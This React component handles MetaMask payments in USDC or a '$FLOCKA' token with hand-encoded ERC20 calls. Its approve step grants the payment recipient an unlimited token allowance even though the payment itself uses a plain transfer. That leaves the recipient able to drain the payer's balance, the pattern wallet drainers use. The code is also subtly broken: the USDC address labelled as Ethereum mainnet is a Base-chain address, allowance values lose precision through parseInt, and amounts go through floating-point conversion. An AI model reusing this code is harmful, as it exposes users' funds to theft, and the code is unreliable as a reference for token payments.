'use client'

import { useState, useEffect } from 'react'

interface PaymentProcessorProps {
  amount: number
  currency: 'USDC' | 'FLOCKA'
  recipientAddress: string
  tokenAddress: string
  walletAddress: string
  orderNumber: string
  onPaymentComplete: (txHash: string) => void
  onPaymentProcessing: () => void
  onPaymentFailed: () => void
}

// Current USD rate of $FLOCKA token
const FLOCKA_USD_RATE = 0.00019856045123770627;
// USDC token address on Ethereum mainnet
const USDC_TOKEN_ADDRESS = '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913';

const PaymentProcessor = ({
  amount,
  currency,
  recipientAddress,
  tokenAddress,
  walletAddress,
  orderNumber,
  onPaymentComplete,
  onPaymentProcessing,
  onPaymentFailed
}: PaymentProcessorProps) => {
  const [status, setStatus] = useState<'idle' | 'approving' | 'sending' | 'completed' | 'failed'>('idle')
  const [txHash, setTxHash] = useState<string>('')
  const [error, setError] = useState<string | null>(null)
  const [isApproved, setIsApproved] = useState<boolean>(false)
  
  // Calculate the amount of $FLOCKA tokens needed based on current rate
  const calculateFlockaAmount = (): number => {
    // If paying in FLOCKA, convert USD amount to FLOCKA tokens
    if (currency === 'FLOCKA') {
      return amount / FLOCKA_USD_RATE;
    }
    return amount;
  }
  
  // Format the token amount for display
  const formatTokenAmount = (): string => {
    if (currency === 'FLOCKA') {
      const flockaAmount = calculateFlockaAmount();
      return flockaAmount.toLocaleString('en-US', {
        maximumFractionDigits: 2
      });
    } else {
      // For USDC, 1 USDC = $1 USD
      return amount.toLocaleString('en-US', {
        maximumFractionDigits: 2
      });
    }
  }
  
  // Convert amount to wei (6 decimals for USDC and 18 for FLOCKA)
  const getAmountInWei = (): string => {
    if (currency === 'USDC') {
      // 6 decimals for USDC
      const amountInWei = amount * Math.pow(10, 6);
      return '0x' + Math.floor(amountInWei).toString(16);
    } else {
      // 18 decimals for FLOCKA
      const flockaAmount = calculateFlockaAmount();
      const amountInWei = flockaAmount * Math.pow(10, 18);
      return '0x' + Math.floor(amountInWei).toString(16);
    }
  }
  
  // Get the correct token address
  const getTokenAddress = (): string => {
    if (currency === 'USDC') {
      return USDC_TOKEN_ADDRESS;
    } else {
      return tokenAddress;
    }
  }
  
  // Check if token is approved
  useEffect(() => {
    const checkAllowance = async (): Promise<void> => {
      // Both USDC and FLOCKA need approval as they are ERC20 tokens
      if (!walletAddress) {
        return;
      }
      
      const currentTokenAddress = getTokenAddress();
      if (!currentTokenAddress) {
        setError('Token address not found');
        return;
      }
      
      try {
        if (typeof window !== 'undefined' && typeof window.ethereum !== 'undefined') {
          // Request account access if needed
          await window.ethereum.request({ method: 'eth_requestAccounts' })
          
          // Get the current network
          const chainId = await window.ethereum.request({ method: 'eth_chainId' })
          console.log('Connected to chain:', chainId)
          
          // ERC20 allowance function signature
          const allowanceData = '0xdd62ed3e' + 
            // Pad sender address
            walletAddress.slice(2).padStart(64, '0') +
            // Pad recipient address
            recipientAddress.slice(2).padStart(64, '0')
          
          // Call allowance function
          const allowanceHex = await window.ethereum.request({
            method: 'eth_call',
            params: [
              {
                to: currentTokenAddress,
                data: allowanceData
              },
              'latest'
            ]
          })
          
          // Convert hex allowance to number
          const allowance = parseInt(allowanceHex, 16)
          const amountInWei = parseInt(getAmountInWei(), 16)
          
          setIsApproved(allowance >= amountInWei)
        } else {
          setError('MetaMask is not installed')
        }
      } catch (err) {
        console.error('Error checking allowance:', err)
        setError('Failed to check token approval status')
      }
    }
    
    if (walletAddress) {
      checkAllowance()
    }
  }, [walletAddress, tokenAddress, recipientAddress, currency, amount])
  
  const approveToken = async (): Promise<void> => {
    const currentTokenAddress = getTokenAddress();
    if (!walletAddress || !currentTokenAddress) {
      setError('Wallet not connected or token address not found')
      return
    }
    
    try {
      setStatus('approving')
      setError(null)
      
      if (typeof window !== 'undefined' && typeof window.ethereum !== 'undefined') {
        // Request account access if needed
        await window.ethereum.request({ method: 'eth_requestAccounts' })
        
        // ERC20 approve function signature
        // Function selector for approve(address,uint256)
        const approveSelector = '0x095ea7b3'
        
        // Encode the recipient address (padded to 32 bytes)
        const paddedRecipient = recipientAddress.slice(2).padStart(64, '0')
        
        // Encode the amount (max uint256 value for unlimited approval)
        const maxUint256 = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
        
        // Combine the function selector and encoded parameters
        const approveData = approveSelector + paddedRecipient + maxUint256
        
        // Send the transaction
        const txHash = await window.ethereum.request({
          method: 'eth_sendTransaction',
          params: [{
            from: walletAddress,
            to: currentTokenAddress,
            data: approveData
          }]
        })
        
        // Wait for transaction confirmation
        setStatus('idle')
        setIsApproved(true)
        console.log('Approval transaction hash:', txHash)
      } else {
        throw new Error('MetaMask is not installed')
      }
    } catch (err) {
      console.error('Error approving token:', err)
      setError('Failed to approve token: ' + (err instanceof Error ? err.message : String(err)))
      setStatus('failed')
      onPaymentFailed()
    }
  }
  
  const sendPayment = async (): Promise<void> => {
    if (!walletAddress) {
      setError('Wallet not connected')
      return
    }
    
    try {
      setStatus('sending')
      setError(null)
      onPaymentProcessing()
      
      if (typeof window !== 'undefined' && typeof window.ethereum !== 'undefined') {
        // Request account access if needed
        await window.ethereum.request({ method: 'eth_requestAccounts' })
        
        let transactionHash;
        const currentTokenAddress = getTokenAddress();
        
        // For both USDC and FLOCKA, we use the ERC20 transfer function
        // Function selector for transfer(address,uint256)
        const transferSelector = '0xa9059cbb'
        
        // Encode the recipient address (padded to 32 bytes)
        const paddedRecipient = recipientAddress.slice(2).padStart(64, '0')
        
        // Encode the amount
        const amountHex = getAmountInWei().slice(2).padStart(64, '0')
        
        // Combine the function selector and encoded parameters
        const transferData = transferSelector + paddedRecipient + amountHex
        
        transactionHash = await window.ethereum.request({
          method: 'eth_sendTransaction',
          params: [{
            from: walletAddress,
            to: currentTokenAddress,
            data: transferData
          }]
        })
        
        setTxHash(transactionHash)
        setStatus('completed')
        onPaymentComplete(transactionHash)
      } else {
        throw new Error('MetaMask is not installed')
      }
    } catch (err) {
      console.error('Error sending payment:', err)
      setError('Payment failed: ' + (err instanceof Error ? err.message : String(err)))
      setStatus('failed')
      onPaymentFailed()
    }
  }
  
  return (
    <div className="border border-gray-200 rounded-lg p-4">
      <div className="mb-4">
        <h3 className="text-lg font-medium mb-2">Payment Details</h3>
        <p className="mb-1">Amount: ${amount.toFixed(2)} USD</p>
        <p className="mb-1">{currency} Amount: {formatTokenAmount()} {currency}</p>
        <p className="mb-1">Recipient: {recipientAddress.substring(0, 6)}...{recipientAddress.substring(recipientAddress.length - 4)}</p>
        <p className="mb-1">Token Address: {getTokenAddress().substring(0, 6)}...{getTokenAddress().substring(getTokenAddress().length - 4)}</p>
        {currency === 'FLOCKA' && (
          <p className="mb-1 text-xs text-gray-500">Current $FLOCKA Rate: ${FLOCKA_USD_RATE.toFixed(10)} USD</p>
        )}
      </div>
      
      {error && (
        <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-4">
          {error}
        </div>
      )}
      
      <div className="space-y-4">
        {!isApproved && (
          <button
            onClick={approveToken}
            disabled={status === 'approving' || status === 'sending'}
            className={`w-full py-3 px-4 rounded font-medium ${
              status === 'approving'
                ? 'bg-yellow-400 text-white cursor-wait'
                : 'bg-yellow-500 text-white hover:bg-yellow-600'
            }`}
          >
            {status === 'approving' ? 'Approving...' : `Approve ${currency} Token`}
          </button>
        )}
        
        <button
          onClick={sendPayment}
          disabled={status === 'sending' || status === 'completed' || !isApproved}
          className={`w-full py-3 px-4 rounded font-medium ${
            status === 'sending'
              ? 'bg-blue-400 text-white cursor-wait'
              : status === 'completed'
                ? 'bg-green-600 text-white cursor-default'
                : !isApproved
                  ? 'bg-gray-300 text-gray-500 cursor-not-allowed'
                  : 'bg-blue-600 text-white hover:bg-blue-700'
          }`}
        >
          {status === 'sending' 
            ? 'Processing Payment...' 
            : status === 'completed' 
              ? 'Payment Completed' 
              : 'Pay Now'}
        </button>
      </div>
      
      {status === 'sending' && (
        <div className="mt-4 flex items-center justify-center">
          <div className="animate-spin rounded-full h-6 w-6 border-t-2 border-b-2 border-blue-600 mr-2"></div>
          <p>Processing your payment. Please wait and don't close this page.</p>
        </div>
      )}
      
      {status === 'completed' && txHash && (
        <div className="mt-4 bg-green-50 border border-green-200 rounded p-3">
          <p className="font-medium text-green-800">Payment successful!</p>
          <p className="text-sm text-green-700 mt-1">
            Transaction Hash: 
            <a 
              href={`https://etherscan.io/tx/${txHash}`} 
              target="_blank" 
              rel="noopener noreferrer"
              className="ml-1 text-blue-600 hover:underline break-all"
            >
              {txHash}
            </a>
          </p>
        </div>
      )}
    </div>
  )
}

export default PaymentProcessor
